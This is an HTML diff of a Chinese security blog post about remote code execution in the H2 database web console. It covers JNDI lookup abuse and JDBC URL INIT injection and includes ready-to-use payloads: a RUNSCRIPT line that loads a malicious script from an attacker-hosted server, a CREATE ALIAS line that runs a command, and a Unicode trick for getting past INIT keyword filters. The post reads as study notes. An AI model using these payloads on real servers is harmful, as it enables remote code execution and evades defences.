@@ -13,7 +13,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://mapl3miss.github.io/"/>
+    <link rel="canonical" href="https://mapl3miss.github.io/2025/09/19/h2数据库相关漏洞/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -22,14 +22,17 @@
     
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="https://mapl3miss.github.io/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="H2数据库相关漏洞">
+<meta property="og:url" content="https://mapl3miss.github.io/2025/09/19/H2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://mapl3miss.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-09-19T04:22:05.000Z">
+<meta property="article:modified_time" content="2025-12-29T13:06:13.085Z">
 <meta property="article:author" content="John Doe">
+<meta property="article:tag" content="javaSec,redTeam">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://mapl3miss.github.io/images/redefine-og.webp">
     
@@ -43,7 +46,7 @@
     
     <title>
         
-            Mapl3miss&#39;s blog - My Cybersecurity Journey
+            H2数据库相关漏洞 | Mapl3miss&#39;s blog
         
     </title>
 
@@ -121,74 +124,17 @@
 <main class="page-container" id="swup">
 
 	
-	
-    <style>
-        .home-banner-container {
-            background: none !important;
-        }
-        .home-article-item,
-        .sidebar-links,
-        .sidebar-content,
-        a.page-number,
-        a.extend,
-        .sidebar-links .links:hover,
-        .right-bottom-tools,
-        footer.footer {
-            background-color: var(--background-color-transparent-80) !important;
-        }
-        .right-bottom-tools:hover,
-        a.page-number:hover,
-        a.extend:hover {
-            background-color: var(--primary-color) !important;
-        }
-        .site-info,
-        .home-article-sticky-label {
-            background-color: var(--background-color-transparent-15) !important;
-        }
-        .home-article-sticky-label {
-            backdrop-filter: none !important;
-        }
-    </style>
-    <div class="home-banner-background transition-fade fixed top-0 left-0 w-screen h-screen scale-125 sm:scale-110 box-border will-change-transform bg-cover">
-        <img src="/images/wallhaven-wqery6-light.webp" alt="home-banner-background" class="w-full h-full object-cover dark:hidden">
-        <img src="/images/wallhaven-wqery6-dark.webp" alt="home-banner-background" class="w-full h-full object-cover hidden dark:block">
-    </div>
-
-
-<div class="home-banner-container flex justify-center items-center transition-fade relative">
-    
-    <div class="content mt-8 flex flex-col justify-center items-center transition-fade-down">
-        <div class="description flex flex-col justify-center items-center w-screen font-medium text-center"
-        
-        >
-            Mapl3miss
-            
-            
-                <p><i id="subtitle"></i></p>
-            
-        </div>
-        
-    </div>
-    <script>
-        const scrollToMain = ()=> {
-            console.log('scroll');
-            const target = document.querySelector('.main-content-container');
-            target.scrollIntoView({ behavior: 'smooth'});
-        }
-    </script>
-</div>
-	
 
 	<div class="main-content-container flex flex-col justify-between min-h-dvh">
 		<div class="main-content-header">
 			<header class="navbar-container px-6 md:px-12">
-    <div class="navbar-content transition-navbar has-home-banner">
+    <div class="navbar-content transition-navbar ">
         <div class="left">
             
             <a class="logo-title" href="/">
-                <h1>
+                
                 Mapl3miss&#39;s blog
-                </h1>
+                
             </a>
         </div>
 
@@ -202,7 +148,7 @@
 
                             <li class="navbar-item">
                                 <!-- Menu -->
-                                <a class="active"
+                                <a class=""
                                    href="/"
                                         >
                                     <i class="fa-regular fa-house fa-fw"></i>
@@ -260,7 +206,7 @@
 
                     <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                         
-                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                            href="/"
                         >
                             <span>
@@ -325,440 +271,293 @@
 
 		<div class="main-content-body transition-fade-up">
 			
-			<div class="home-sidebar-container">
-    <div class="sticky-container sticky">
-        
-        
-            
-            <div class="sidebar-content" >
-                <div class="avatar flex justify-center">
-    <img src="/images/avatar.jpg">
-</div>
-                <div class="author flex flex-col justify-center my-2.5 mx-0">
-    <div class="name">mapl3miss</div>
-    
-        <div class="label">Lv1</div>
-    
-</div>
-                <div class="statistics flex justify-around my-2.5">
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
-        <div class="label text-third-text-color text-sm">Tags</div>
-    </a>
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
-        <div class="label text-third-text-color text-sm">Categories</div>
-    </a>
-    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
-        <div class="label text-third-text-color text-sm">Posts</div>
-    </a>
-</div>
-            </div>
-        
-
-    </div>
-</div>
-
-			
 
 			<div class="main-content">
-				<div class="home-content-container">
-    <ul class="home-article-list">
-        
-            <li class="home-article-item">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
-                
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">H2数据库相关漏洞</h1>
+			</div>
+			
+		</div>
 
-                
-
-                
-                <div class="flex flex-col gap-5 px-7 pb-7 pt-7">
-                    <h3 class="home-article-title">
-                        <a href="/2025/12/29/JDBC-mysql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
-                            
-                        </a>
-                    </h3>
-
-                    <div class="home-article-content markdown-body">
-                        
-                            
-                            123title: JDBC mysql任意文件读取漏洞date: 2025-09-19 12:22:05tags: javaSec,redTeam
-
-读文件当我们可以控制jdbc mysql连接的时候,我们可以通过设置如下这几个参数通过连接恶意mysql服务器来达到任意文件读取的危害
-1234567文件读取的参数allowLoadLocalInfileInPath=/ 设置读的目录为根目录...
-                        
-                    </div>
-
-                    <div class="home-article-meta-info-container">
-    <div class="home-article-meta-info">
-        <span><i class="fa-solid fa-calendars"></i>&nbsp;
-            <span class="home-article-date" data-date="Mon Dec 29 2025 20:19:15 GMT+0800">
-                
-                    2025-12-29
-                
-            </span>
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/avatar.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">mapl3miss</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-09-19 12:22:05</span>
+        <span class="mobile">2025-09-19 12:22:05</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-12-29 21:06:13</span>
+            <span class="mobile">2025-12-29 21:06:13</span>
+            <span class="hover-info">Updated</span>
         </span>
-        
-        
-    </div>
+    
 
-    <a href="/2025/12/29/JDBC-mysql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">Read more<span class="seo-reader-text"></span>&nbsp;<i class="fa-solid fa-angle-right"></i></a>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/javaSec-redTeam/">javaSec,redTeam</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
 </div>
 
-                </div>
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>H2 Database是一个纯Java编写的关系型数据库，可以在内存中运行，通常用在小型的应用，自带一个web管理页面,这个H2管理web应用存在一些远程代码执行漏洞,默认不开启，如果开启,默认是不对外开放的,只能本地访问(但是可以配合ssrf漏洞来攻击)</p>
+<p>相关配置</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">spring.h2.console.path=/h2-console   # 自定义访问路径</span><br><span class="line">spring.h2.console.settings.web-allow-others=true  # 允许非本机访问</span><br><span class="line">spring.h2.console.enabled=true   # 启用web管理界面</span><br><span class="line">spring.h2.console.settings.web-allow-others=true   # 允许外部用户进行访问管理界面</span><br></pre></td></tr></table></figure></div>
+
+<p>环境搭建: <a class="link"   target="_blank" rel="noopener" href="https://springdoc.cn/spring-boot-h2-database/" >Spring Boot 整合使用 H2 内存数据库 - spring 中文网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h1 id="1-4-x系列-兼容java8的版本"><a href="#1-4-x系列-兼容java8的版本" class="headerlink" title="1.4.x系列(兼容java8的版本)"></a>1.4.x系列(兼容java8的版本)</h1><p>环境:java8 + 1.4.200(1.4系列最新版)</p>
+<h3 id="H2-Database-打JNDI"><a href="#H2-Database-打JNDI" class="headerlink" title="H2 Database 打JNDI"></a>H2 Database 打JNDI</h3><p>1.1.100&lt;&#x3D; H2 Console &lt;&#x3D;2.0.204</p>
+<p>H2允许通过jndi的形式加载数据源,但没有对lookup()参数做校验导致漏洞</p>
+<p><code>org.h2.util.JdbcUtils.getConnection()</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Pastedimage20251228170052.png"
+                     
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Pastedimage20251228170108.png"
+                     
+                ></p>
+<h3 id="H2-JDBC连接处利用INIT函数"><a href="#H2-JDBC连接处利用INIT函数" class="headerlink" title="H2 JDBC连接处利用INIT函数"></a>H2 JDBC连接处利用INIT函数</h3><p><em>需要目标服务器有javac环境</em></p>
+<p>H2 支持在 JDBC URL 里用 <code>INIT=</code> 指定一段 SQL,在数据库连接建立时自动执行并且支持 <code>CREATE ALIAS</code> 直接定义 Java 方法,这就导致了可以任意java代码执行</p>
+<p>出网payload(vps上共享的恶意文件不一定要.sql文件,空后缀也可以,可以用来绕过拦截)</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:file:.\\data\\demo;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:7777/poc.sql&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>不出网payload</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:file:.\\data\\demo;INIT=DROP ALIAS IF EXISTS EXEC\;CREATE ALIAS EXEC AS $$void shellexec() throws Exception &#123;Runtime.getRuntime().exec(&quot;calc&quot;)\;&#125;$$\;CALL EXEC()</span><br></pre></td></tr></table></figure></div>
+
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Pastedimage20251228155743.png"
+                     
+                ></p>
+<h1 id="2-x-系列-需要java11-环境"><a href="#2-x-系列-需要java11-环境" class="headerlink" title="2.x 系列(需要java11+环境)"></a>2.x 系列(需要java11+环境)</h1><p>环境: java11 + 2.4.240</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Pastedimage20251228151917.png"
+                     
+                ></p>
+<h3 id="H2-Database-打JNDI-被修复"><a href="#H2-Database-打JNDI-被修复" class="headerlink" title="H2 Database 打JNDI(被修复)"></a>H2 Database 打JNDI(被修复)</h3><p>这个漏洞在2.0.204版本被修复,jndi禁用了不安全协议,只允许本地java协议去加载数据</p>
+<p><code>org.h2.util.JdbcUtils.getConnection()</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Pastedimage20251228193530.png"
+                     
+                ></p>
+<h3 id="H2-JDBC连接处利用INIT函数-1"><a href="#H2-JDBC连接处利用INIT函数-1" class="headerlink" title="H2 JDBC连接处利用INIT函数"></a>H2 JDBC连接处利用INIT函数</h3><p>和1.4.x版本一样,不修复是因为官方认为这是正常功能</p>
+<p>出网payload(vps上共享的恶意文件不一定要.sql文件,空后缀也可以,可以用来绕过拦截)</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:file:.\\data\\demo;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:7777/poc.sql&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>不出网payload</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:file:.\\data\\demo;INIT=DROP ALIAS IF EXISTS EXEC\;CREATE ALIAS EXEC AS $$void shellexec() throws Exception &#123;Runtime.getRuntime().exec(&quot;calc&quot;)\;&#125;$$\;CALL EXEC()</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Pastedimage20251228193955.png"
+                     
+                ></p>
+<p>CREATE ALIAS 除了可以创建 Java 函数外, 还能够直接引用已知的 Java 静态方法, 这个过程无需javac环境<br><a class="link"   target="_blank" rel="noopener" href="https://exp10it.io/posts/h2-rce-in-jre-17/" >H2 RCE 在 JRE 17 环境下的利用 | X1r0z Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h1 id="INIT关键词绕过"><a href="#INIT关键词绕过" class="headerlink" title="INIT关键词绕过"></a>INIT关键词绕过</h1><p>h2自动小写转大写，而“ı”转成大写后等于“I”。“ſ”大写后变成“S”,所以</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INIT=ınıt</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Pastedimage20251229113441.png"
+                     
+                ></p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> H2数据库相关漏洞</li>
+        <li><strong>Author:</strong> mapl3miss</li>
+        <li><strong>Created at
+                :</strong> 2025-09-19 12:22:05</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-12-29 21:06:13
             </li>
         
-            <li class="home-article-item">
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/09/19/H2数据库相关漏洞/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
 
-                
-
-                
-
-                
-                <div class="flex flex-col gap-5 px-7 pb-7 pt-7">
-                    <h3 class="home-article-title">
-                        <a href="/2025/09/19/H2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/">
-                            H2数据库相关漏洞
-                        </a>
-                    </h3>
-
-                    <div class="home-article-content markdown-body">
-                        
-                            
-                            H2 Database是一个纯Java编写的关系型数据库，可以在内存中运行，通常用在小型的应用，自带一个web管理页面,这个H2管理web应用存在一些远程代码执行漏洞,默认不开启，如果开启,默认是不对外开放的,只能本地访问(但是可以配合ssrf漏洞来攻击)
-相关配置
-1234spring.h2.console.path=/h2-console   # 自定义访问路径spring.h2.con...
-                        
-                    </div>
-
-                    <div class="home-article-meta-info-container">
-    <div class="home-article-meta-info">
-        <span><i class="fa-solid fa-calendars"></i>&nbsp;
-            <span class="home-article-date" data-date="Fri Sep 19 2025 12:22:05 GMT+0800">
-                
-                    2025-09-19
-                
-            </span>
-        </span>
-        
-        
-            <span class="home-article-tag">
-                <i class="fa-solid fa-tags"></i>&nbsp;
-                <ul>
-                    
-                        <li>
-                            
-                            <a href="/tags/javaSec-redTeam/">javaSec,redTeam</a>&nbsp;
-                        </li>
-                    
-                </ul>
-            </span>
-        
-    </div>
-
-    <a href="/2025/09/19/H2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/">Read more<span class="seo-reader-text">H2数据库相关漏洞</span>&nbsp;<i class="fa-solid fa-angle-right"></i></a>
-</div>
-
-                </div>
-            </li>
-        
-            <li class="home-article-item">
-
-                
-
-                
-
-                
-                <div class="flex flex-col gap-5 px-7 pb-7 pt-7">
-                    <h3 class="home-article-title">
-                        <a href="/2025/09/19/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
-                            JDBC反序列化漏洞
-                        </a>
-                    </h3>
-
-                    <div class="home-article-content markdown-body">
-                        
-                            
-                              当可以控制一个网站jdbc连接数据时,如果web应用存在反序列化链,并且jdbc依赖处于危险版本就可以打jdbc反序列化来RCE或读文件
-Mysql版本小于8.0.20存在漏洞
-环境mysql jdbc依赖版本8.0.19恶意链CC3.2.1
-ServerStatusDiffInterceptor链(最常用)123456789101112131415161718192021import ...
-                        
-                    </div>
-
-                    <div class="home-article-meta-info-container">
-    <div class="home-article-meta-info">
-        <span><i class="fa-solid fa-calendars"></i>&nbsp;
-            <span class="home-article-date" data-date="Fri Sep 19 2025 12:22:05 GMT+0800">
-                
-                    2025-09-19
-                
-            </span>
-        </span>
-        
-        
-            <span class="home-article-tag">
-                <i class="fa-solid fa-tags"></i>&nbsp;
-                <ul>
-                    
-                        <li>
-                            
-                            <a href="/tags/javaSec-redTeam/">javaSec,redTeam</a>&nbsp;
-                        </li>
-                    
-                </ul>
-            </span>
-        
-    </div>
-
-    <a href="/2025/09/19/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Read more<span class="seo-reader-text">JDBC反序列化漏洞</span>&nbsp;<i class="fa-solid fa-angle-right"></i></a>
-</div>
-
-                </div>
-            </li>
-        
-            <li class="home-article-item">
-
-                
-
-                
-
-                
-                <div class="flex flex-col gap-5 px-7 pb-7 pt-7">
-                    <h3 class="home-article-title">
-                        <a href="/2025/08/11/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                            Jackson反序列化
-                        </a>
-                    </h3>
-
-                    <div class="home-article-content markdown-body">
-                        
-                            
-                            解决多态问题一、DefaultTyping设置
-
-
-DefaultTyping类型
-描述说明
-
-
-
-JAVA_LANG_OBJECT
-属性的类型为Object
-
-
-OBJECT_AND_NON_CONCRETE
-属性的类型为Object、Interface、AbstractClass
-
-
-NON_CONCRETE_AND_ARRAYS
-属性的类型为Object、Interface、Abstr...
-                        
-                    </div>
-
-                    <div class="home-article-meta-info-container">
-    <div class="home-article-meta-info">
-        <span><i class="fa-solid fa-calendars"></i>&nbsp;
-            <span class="home-article-date" data-date="Mon Aug 11 2025 12:11:33 GMT+0800">
-                
-                    2025-08-11
-                
-            </span>
-        </span>
-        
-        
-            <span class="home-article-tag">
-                <i class="fa-solid fa-tags"></i>&nbsp;
-                <ul>
-                    
-                        <li>
-                            
-                            <a href="/tags/javaSec/">javaSec</a>&nbsp;
-                        </li>
-                    
-                </ul>
-            </span>
-        
-    </div>
-
-    <a href="/2025/08/11/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Read more<span class="seo-reader-text">Jackson反序列化</span>&nbsp;<i class="fa-solid fa-angle-right"></i></a>
-</div>
-
-                </div>
-            </li>
-        
-            <li class="home-article-item">
-
-                
-
-                
-
-                
-                <div class="flex flex-col gap-5 px-7 pb-7 pt-7">
-                    <h3 class="home-article-title">
-                        <a href="/2025/07/31/JDWP/">
-                            JDWP
-                        </a>
-                    </h3>
-
-                    <div class="home-article-content markdown-body">
-                        
-                            
-                            JDWP（Java Debug Wire Protocol Transport Interface）协议是用于调试器（debugger）和被调试的Java虚拟机（Target VM）之前的通信协议
-启动方式JDK自带1java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5050 -jar xxx.jar
-ide...
-                        
-                    </div>
-
-                    <div class="home-article-meta-info-container">
-    <div class="home-article-meta-info">
-        <span><i class="fa-solid fa-calendars"></i>&nbsp;
-            <span class="home-article-date" data-date="Thu Jul 31 2025 12:06:55 GMT+0800">
-                
-                    2025-07-31
-                
-            </span>
-        </span>
-        
-        
-            <span class="home-article-tag">
-                <i class="fa-solid fa-tags"></i>&nbsp;
-                <ul>
-                    
-                        <li>
-                            
-                            <a href="/tags/javasec/">javasec</a>&nbsp;
-                        </li>
-                    
-                </ul>
-            </span>
-        
-    </div>
-
-    <a href="/2025/07/31/JDWP/">Read more<span class="seo-reader-text">JDWP</span>&nbsp;<i class="fa-solid fa-angle-right"></i></a>
-</div>
-
-                </div>
-            </li>
-        
-            <li class="home-article-item">
-
-                
-
-                
-
-                
-                <div class="flex flex-col gap-5 px-7 pb-7 pt-7">
-                    <h3 class="home-article-title">
-                        <a href="/2025/07/18/Linux%E5%BA%94%E6%80%A5/">
-                            Linux应急
-                        </a>
-                    </h3>
-
-                    <div class="home-article-content markdown-body">
-                        
-                            
-                            netstat
-123456789101112131415161718192021222324252627282930313233343536373839404142用法:  netstat [-vWeenNcCF] [&lt;地址族&gt;] -r         显示路由表  netstat [-vWnNcaeol] [&lt;套接字&gt; ...]        显示套接字连接  n...
-                        
-                    </div>
-
-                    <div class="home-article-meta-info-container">
-    <div class="home-article-meta-info">
-        <span><i class="fa-solid fa-calendars"></i>&nbsp;
-            <span class="home-article-date" data-date="Fri Jul 18 2025 15:54:41 GMT+0800">
-                
-                    2025-07-18
-                
-            </span>
-        </span>
-        
-        
-            <span class="home-article-tag">
-                <i class="fa-solid fa-tags"></i>&nbsp;
-                <ul>
-                    
-                        <li>
-                            
-                            <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>&nbsp;
-                        </li>
-                    
-                </ul>
-            </span>
-        
-    </div>
-
-    <a href="/2025/07/18/Linux%E5%BA%94%E6%80%A5/">Read more<span class="seo-reader-text">Linux应急</span>&nbsp;<i class="fa-solid fa-angle-right"></i></a>
-</div>
-
-                </div>
-            </li>
-        
-            <li class="home-article-item">
-
-                
-
-                
-
-                
-                <div class="flex flex-col gap-5 px-7 pb-7 pt-7">
-                    <h3 class="home-article-title">
-                        <a href="/2025/07/16/windows%E5%BA%94%E6%80%A5/">
-                            windows应急
-                        </a>
-                    </h3>
-
-                    <div class="home-article-content markdown-body">
-                        
-                            
-                            相关命令netstat用于 显示网络连接、路由表、接口统计等信息
-1234netstat -ano普通用户netstat -abno需要管理员权限
-
-1234567891011121314NETSTAT [-a] [-b] [-e] [-f] [-i] [-n] [-o] [-p proto] [-r] [-s] [-t] [-x] [-y] [interval] -a           ...
-                        
-                    </div>
-
-                    <div class="home-article-meta-info-container">
-    <div class="home-article-meta-info">
-        <span><i class="fa-solid fa-calendars"></i>&nbsp;
-            <span class="home-article-date" data-date="Wed Jul 16 2025 12:43:56 GMT+0800">
-                
-                    2025-07-16
-                
-            </span>
-        </span>
-        
-        
-            <span class="home-article-tag">
-                <i class="fa-solid fa-tags"></i>&nbsp;
-                <ul>
-                    
-                        <li>
-                            
-                            <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>&nbsp;
-                        </li>
-                    
-                </ul>
-            </span>
-        
-    </div>
-
-    <a href="/2025/07/16/windows%E5%BA%94%E6%80%A5/">Read more<span class="seo-reader-text">windows应急</span>&nbsp;<i class="fa-solid fa-angle-right"></i></a>
-</div>
-
-                </div>
-            </li>
-        
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
     </ul>
-
-    <div class="home-paginator px-7 py-5">
-        <div class="paginator">
-	<span class="page-number current">1</span>
 </div>
-  
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/javaSec-redTeam/">#javaSec,redTeam</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/12/29/JDBC-mysql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item"></span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/09/19/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">JDBC反序列化漏洞</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
     </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
 </div>
 
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">H2数据库相关漏洞</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-4-x%E7%B3%BB%E5%88%97-%E5%85%BC%E5%AE%B9java8%E7%9A%84%E7%89%88%E6%9C%AC"><span class="nav-text">1.4.x系列(兼容java8的版本)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#H2-Database-%E6%89%93JNDI"><span class="nav-text">H2 Database 打JNDI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#H2-JDBC%E8%BF%9E%E6%8E%A5%E5%A4%84%E5%88%A9%E7%94%A8INIT%E5%87%BD%E6%95%B0"><span class="nav-text">H2 JDBC连接处利用INIT函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-x-%E7%B3%BB%E5%88%97-%E9%9C%80%E8%A6%81java11-%E7%8E%AF%E5%A2%83"><span class="nav-text">2.x 系列(需要java11+环境)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#H2-Database-%E6%89%93JNDI-%E8%A2%AB%E4%BF%AE%E5%A4%8D"><span class="nav-text">H2 Database 打JNDI(被修复)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#H2-JDBC%E8%BF%9E%E6%8E%A5%E5%A4%84%E5%88%A9%E7%94%A8INIT%E5%87%BD%E6%95%B0-1"><span class="nav-text">H2 JDBC连接处利用INIT函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#INIT%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="nav-text">INIT关键词绕过</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
 			</div>
 
 			
@@ -836,6 +635,26 @@ ide...
 		</div>
 	</div>
 
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
